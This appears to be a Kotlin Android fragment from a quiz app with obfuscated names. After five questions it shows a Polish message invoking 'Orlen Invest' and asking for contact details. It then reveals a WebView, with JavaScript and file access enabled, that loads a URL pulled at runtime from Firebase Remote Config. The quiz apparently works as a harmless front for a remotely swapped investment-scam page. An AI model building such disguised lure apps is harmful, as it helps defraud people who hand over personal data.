package log.zug.main.modeljson.fragments

import android.content.Context
import android.os.Bundle
import android.os.CountDownTimer
import android.os.Vibrator
import android.util.Log
import androidx.fragment.app.Fragment
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.webkit.WebViewClient
import androidx.core.view.isVisible
import androidx.lifecycle.ViewModel
import androidx.lifecycle.ViewModelProvider
import androidx.navigation.fragment.findNavController
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import kotlinx.coroutines.*
import log.zug.main.databinding.FragmentBlackBinding
import log.zug.main.databinding.FragmentZugBinding
import log.zug.main.modeljson.const.MAIN
import log.zug.main.modeljson.const.rebjvbhehrv
import log.zug.main.modeljson.const.wevgkjbwvjubvkj
import log.zug.main.modeljson.vmzug.ViewModelZug


class BlackFragment : Fragment() {
    var i = 0
    lateinit var binding: FragmentBlackBinding
    lateinit var quizViewModel: ViewModelZug
    var actionFragment = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

    }

    private fun setClick(){
        binding.btnOne.setOnClickListener {
            setClickButton(quizViewModel.hrvfgureghvkkk1(),binding.viewTrue1,binding.viewFalse1)
        }

        binding.btnTwo.setOnClickListener {
            setClickButton(quizViewModel.hrvfgureghvkkk2(),binding.viewTrue2,binding.viewFalse2)
        }

        binding.btnThree.setOnClickListener {
            setClickButton(quizViewModel.hrvfgureghvkkk3(),binding.viewTrue3,binding.viewFalse3)
        }

        binding.btnFoure.setOnClickListener {
            setClickButton(quizViewModel.hrvfgureghvkkk4(),binding.viewTrue4,binding.viewFalse4)
        }

    }

    private fun setView(){
        quizViewModel = ViewModelProvider(this).get(ViewModelZug::class.java)
        binding = FragmentBlackBinding.inflate(layoutInflater)
        binding.btnOne.setText(quizViewModel.mainDataList[0].textResID1)
        binding.btnTwo.setText(quizViewModel.mainDataList[0].textResID2)
        binding.btnThree.setText(quizViewModel.mainDataList[0].textResId3)
        binding.btnFoure.setText(quizViewModel.mainDataList[0].textResId4)
        binding.tvQestion.setText(quizViewModel.mainDataList[0].textQestion)
        ++i }

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {

        MAIN.goBack = {binding.webView.goBack()}
        setView()
        with(binding.webView) {
            settings.setLoadsImagesAutomatically(true)
            webViewClient = WebViewClient()
            settings.allowFileAccess = true
            settings.mixedContentMode = 0
            settings.javaScriptEnabled = true
            settings.javaScriptCanOpenWindowsAutomatically = true
            settings.javaScriptEnabled = true
            settings.domStorageEnabled = true

            CoroutineScope(Dispatchers.IO).launch {
                    var fireBase = async {
                        FirebaseRemoteConfig
                            .getInstance()
                            .getString("getToUrl")
                    }.await()
                    Log.d("fireBase1", fireBase)
                withContext(Dispatchers.Main) {
                    loadUrl(fireBase)
                }
            }.start()

        }
        setClick()

        binding.Bplay.setOnClickListener {
            binding.CLmain.isVisible = false
            binding.btnOne.isVisible = true
            binding.btnTwo.isVisible = true
            binding.btnThree.isVisible = true
            binding.btnFoure.isVisible = true
        }

        return binding.root
    }

    private fun setClickButton(trueOrFalse : Boolean, viewTrue : View, viewFalse : View) {
        if(actionFragment) {
            binding.webView.isVisible = true
            binding.btnOne.isVisible = false
            binding.btnTwo.isVisible = false
            binding.btnThree.isVisible = false
            binding.btnFoure.isVisible = false
        }
        else {
            quizViewModel.kgoijkjjjkjk()

            when(i){
                0 ->{
                    binding.btnOne.setText(quizViewModel.mainDataList[0].textResID1)
                    binding.btnTwo.setText(quizViewModel.mainDataList[0].textResID2)
                    binding.btnThree.setText(quizViewModel.mainDataList[0].textResId3)
                    binding.btnFoure.setText(quizViewModel.mainDataList[0].textResId4)
                    binding.tvQestion.setText(quizViewModel.mainDataList[0].textQestion)

                    ++i
                }
                1 ->{
                    binding.btnOne.setText(quizViewModel.mainDataList[1].textResID1)
                    binding.btnTwo.setText(quizViewModel.mainDataList[1].textResID2)
                    binding.btnThree.setText(quizViewModel.mainDataList[1].textResId3)
                    binding.btnFoure.setText(quizViewModel.mainDataList[1].textResId4)
                    binding.tvQestion.setText(quizViewModel.mainDataList[1].textQestion)

                    ++i
                }
                2 ->{
                    binding.btnOne.setText(quizViewModel.mainDataList[2].textResID1)
                    binding.btnTwo.setText(quizViewModel.mainDataList[2].textResID2)
                    binding.btnThree.setText(quizViewModel.mainDataList[2].textResId3)
                    binding.btnFoure.setText(quizViewModel.mainDataList[2].textResId4)
                    binding.btnFoure.setText(quizViewModel.mainDataList[2].textQestion)
                    binding.tvQestion.setText(quizViewModel.mainDataList[2].textQestion)
                    ++i
                }
                3 ->{
                    binding.btnOne.setText(quizViewModel.mainDataList[3].textResID1)
                    binding.btnTwo.setText(quizViewModel.mainDataList[3].textResID2)
                    binding.btnThree.setText(quizViewModel.mainDataList[3].textResId3)
                    binding.btnFoure.setText(quizViewModel.mainDataList[3].textResId4)
                    binding.tvQestion.setText(quizViewModel.mainDataList[3].textQestion)
                    ++i
                }
                4 -> {
                    binding.btnOne.setText(quizViewModel.mainDataList[4].textResID1)
                    binding.btnTwo.setText(quizViewModel.mainDataList[4].textResID2)
                    binding.btnThree.setText(quizViewModel.mainDataList[4].textResId3)
                    binding.btnFoure.setText(quizViewModel.mainDataList[4].textResId4)
                    binding.tvQestion.setText(quizViewModel.mainDataList[4].textQestion)
                    ++i
                }
                5 -> {
                    binding.btnOne.isVisible = false
                    binding.btnTwo.isVisible = false
                    binding.btnThree.isVisible = false
                    binding.btnFoure.setText("go!")
                    binding.tvQestion.setText("Gratulacje Orlen Invest zapewnia bezpłatny dostęp do platformy! " +
                            "Zostaw swoje dane kontaktowe, aby uzyskać dostęp.")
                    ++i
                }

            }

            wviuvruj(1000L, viewTrue, viewFalse)
        }
        if (trueOrFalse) {
            wevgkjbwvjubvkj++
            viewTrue.visibility = View.VISIBLE
        } else {
            rebjvbhehrv++
            viewFalse.visibility = View.VISIBLE

        }
    }

    private fun wviuvruj(ewvkjv:Long, cvik: View, wvjcv: View ){

        object : CountDownTimer(ewvkjv, ewvkjv) {
            override fun onTick(millisUntilFinished: Long) {}

            override fun onFinish() {

                wvjcv.visibility = View.INVISIBLE
                cvik.visibility = View.INVISIBLE
                if(quizViewModel.efjdhfh == 5) {
                    actionFragment = true
                }
            }
        }.start()
    }



}